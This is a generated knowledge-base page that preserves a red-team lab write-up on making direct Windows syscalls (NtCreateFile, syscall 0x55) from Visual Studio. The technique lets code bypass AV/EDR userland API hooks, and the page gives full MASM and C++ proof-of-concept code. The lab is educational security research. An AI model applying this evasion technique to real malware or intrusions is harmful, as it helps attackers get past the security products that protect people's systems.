---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs](../../topics/offensive-security/calling-syscalls-directly-from-visual-studio-to-bypass-avs-edrs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs |
| name | Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (10).png
- image (11).png
- image (12).png
- image (13).png
- image (3).png
- image (5).png
- image (7).png
- image (8).png
- image (9).png
- syscall-debugging.gif
_body: "# Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs\n\nAVs/EDR solutions usually hook userland Windows\
  \ APIs in order to decide if the code that is being executed is malicious or not. It's possible to bypass hooked functions\
  \ by writing your own functions that call syscalls directly.\n\nFor a more detailed explanation of the above, read a great\
  \ research done by [@Cn33liz](https://twitter.com/Cneelis) from [@Outflank](https://twitter.com/OutflankNL): [https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)\
  \ - now you know what inspired me to do this lab.\n\nWith this lab, I wanted to follow along what Cn33liz did and go through\
  \ the process of incorporating and compiling ASM code from the Visual Studio and simply invoking one syscall to see how\
  \ it's all done by myself. In this case, I will be playing with `NtCreateFile` syscall as this will be enough to prove the\
  \ concept.\n\nAlso, see my previous labs about API hooking/unhooking: [Windows API Hooking](../code-injection-process-injection/how-to-hook-windows-api-using-c++.md),\
  \ [Bypassing Cylance and other AVs/EDRs by Unhooking Windows APIs](bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis.md)\n\
  \n## Setting Up Project Environment\n\nAdd a new file to the project, say `syscalls.asm` - make sure the main cpp file has\
  \ a different name as the project will not compile:\n\n![](<../../.gitbook/assets/image (3).png>)\n\nNavigate to project's\
  \ `Build Customizations`:\n\n![](<../../.gitbook/assets/image (7).png>)\n\nEnable `masm`:\n\n![](<../../.gitbook/assets/image\
  \ (5).png>)\n\nConfigure the `syscalls.asm` file to be part of the project and compiled using Microsoft Macro Assembler:\n\
  \n![](<../../.gitbook/assets/image (8).png>)\n\n## Defining Syscalls\n\nIn the `syscalls.asm`, let's define a procedure\
  \ `SysNtCreateFile` with a syscall number 55 that is reserved for `NtCreateFile` in [Windows 10](https://j00ru.vexillium.org/syscalls/nt/64/):\n\
  \n{% code title=\"syscalls.asm\" %}\n```csharp\n.code\n\tSysNtCreateFile proc\n\t\t\tmov r10, rcx\n\t\t\tmov eax, 55h\n\t\
  \t\tsyscall\n\t\t\tret\n\tSysNtCreateFile endp\nend\n```\n{% endcode %}\n\nThe way we can find the procedure's prologue\
  \ (mov r10, rcx, etc..) is by disassembling the function `NtCreateFile` (assuming it's not hooked. If hooked, just do the\
  \ same for, say `NtWriteFile`) using WinDbg found in `ntdll.dll` module or within Visual Studio by resolving the function's\
  \ address and viewing its disassembly there:\n\n```cpp\nFARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\"\
  );\n```\n\n![](<../../.gitbook/assets/image (9).png>)\n\nDisassembling the address of the `NtCreateFile` in `ntdll` - note\
  \ the highlighted instructions and we can skip the `test` / `jne` instructions at this point as they are irrelevant for\
  \ this exercise:\n\n![](<../../.gitbook/assets/image (10).png>)\n\n## Declaring the Calling C Function\n\nOnce we have the\
  \ `SysNtCreateFile` procedure defined in assembly, we need to define the C function prototype that will call that assembly\
  \ procedure. The `NtCreateFile` prototype per [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile)\
  \ is:\n\n```cpp\n// Using the NtCreateFile prototype to define a prototype for SysNtCreateFile. \n// The prorotype name\
  \ needs to match the procedure name defined in the syscalls.asm\n// EXTERN_C tells the compiler to link this function as\
  \ a C function and use stdcall \n// calling convention - Important!\n\nEXTERN_C NTSTATUS SysNtCreateFile(\n\tPHANDLE FileHandle,\
  \ \n\tACCESS_MASK DesiredAccess, \n\tPOBJECT_ATTRIBUTES ObjectAttributes, \n\tPIO_STATUS_BLOCK IoStatusBlock, \n\tPLARGE_INTEGER\
  \ AllocationSize, \n\tULONG FileAttributes, \n\tULONG ShareAccess, \n\tULONG CreateDisposition, \n\tULONG CreateOptions,\
  \ \n\tPVOID EaBuffer, \n\tULONG EaLength\n);\n```\n\nOnce we have the prototype, we can compile the code and check if the\
  \ `SysNtCreateFile` function can now be found in the process memory by entering the function's name in Visual Studio disassembly\
  \ panel:\n\n![](<../../.gitbook/assets/image (11).png>)\n\nThe above indicates that assembly instructions were compiled\
  \ into the binary successfully and once executed, they will issue a syscall `0x55` that is normally called by `NtCreateFile`\
  \ from within ntdll.\n\n## Initializing Variables and Structures\n\nBefore testing `SysNtCreateFile`, we need to initialize\
  \ some structures and variables (like the name of the file name to be opened, access requirements, etc.) required by the\
  \ `NtCreateFile`:\n\n![](<../../.gitbook/assets/image (12).png>)\n\n## Invoking the Syscall\n\nOnce the variables and structures\
  \ are initialized, we are ready to invoke the `SysNtCreateFile`:\n\n```cpp\nSysNtCreateFile(\n\t&fileHandle, \n\tFILE_GENERIC_WRITE,\
  \ \n\t&oa, \n\t&osb, \n\t0, \n\tFILE_ATTRIBUTE_NORMAL, \n\tFILE_SHARE_WRITE, \n\tFILE_OVERWRITE_IF, \n\tFILE_SYNCHRONOUS_IO_NONALERT,\
  \ \n\tNULL, \n\t0\n);\n```\n\nIf we go into debug mode, we can see that all the arguments required by the `SysNtCreateFile`\
  \ are being pushed on to the stack - as seen on the right disassembler panel where the break point on `SysNtCreateFile`\
  \ is set:\n\n![](<../../.gitbook/assets/image (13).png>)\n\nIf we continue debugging, the debugger eventually steps in to\
  \ our assembly code that defines the `SysNtCreateFile` procedure and issues the syscall for `NtCreateFile`. Once the syscall\
  \ finishes executing, a handle to the opened file `c:\\temp\\test.txt` is returned to the variable `fileHandle`:\n\n![](../../.gitbook/assets/syscall-debugging.gif)\n\
  \n## So What?\n\nWhat this all means is that if an AV/EDR product had hooked `NtCreateFile` API call, and was blocking any\
  \ access to the file c:\\temp\\test.txt as part of the hooked routine, we would have bypassed that restriction since we\
  \ did not call the `NtCreateFile` API, but called its syscall directly instead by invoking `SysNtCreateFile` - the AV/EDR\
  \ would not have intercepted our attempt to open the file and we would have opened it successfully.\n\n## Code\n\n{% code\
  \ title=\"syscalls.cpp\" %}\n```cpp\n#include \"pch.h\"\n#include <Windows.h>\n#include \"winternl.h\"\n#pragma comment(lib,\
  \ \"ntdll\")\n\nEXTERN_C NTSTATUS SysNtCreateFile(\n\tPHANDLE FileHandle, \n\tACCESS_MASK DesiredAccess, \n\tPOBJECT_ATTRIBUTES\
  \ ObjectAttributes, \n\tPIO_STATUS_BLOCK IoStatusBlock, \n\tPLARGE_INTEGER AllocationSize, \n\tULONG FileAttributes, \n\t\
  ULONG ShareAccess, \n\tULONG CreateDisposition, \n\tULONG CreateOptions, \n\tPVOID EaBuffer, \n\tULONG EaLength);\n\nint\
  \ main()\n{\n\tFARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\");\n\t\n\tOBJECT_ATTRIBUTES oa;\n\t\
  HANDLE fileHandle = NULL;\n\tNTSTATUS status = NULL;\n\tUNICODE_STRING fileName;\n\tIO_STATUS_BLOCK osb;\n\n\tRtlInitUnicodeString(&fileName,\
  \ (PCWSTR)L\"\\\\??\\\\c:\\\\temp\\\\test.txt\");\n\tZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));\n\tInitializeObjectAttributes(&oa,\
  \ &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);\n\n\tSysNtCreateFile(\n\t\t&fileHandle, \n\t\tFILE_GENERIC_WRITE, \n\t\t\
  &oa, \n\t\t&osb, \n\t\t0, \n\t\tFILE_ATTRIBUTE_NORMAL, \n\t\tFILE_SHARE_WRITE, \n\t\tFILE_OVERWRITE_IF, \n\t\tFILE_SYNCHRONOUS_IO_NONALERT,\
  \ \n\t\tNULL, \n\t\t0);\n\n\treturn 0;\n}\n```\n{% endcode %}\n\n## References\n\n{% embed url=\"https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\"\
  \ %}\n\n{% embed url=\"https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile\" %}\n\n{% embed\
  \ url=\"https://j00ru.vexillium.org/syscalls/nt/64/\" %}"
_relative_path: offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs.md
````
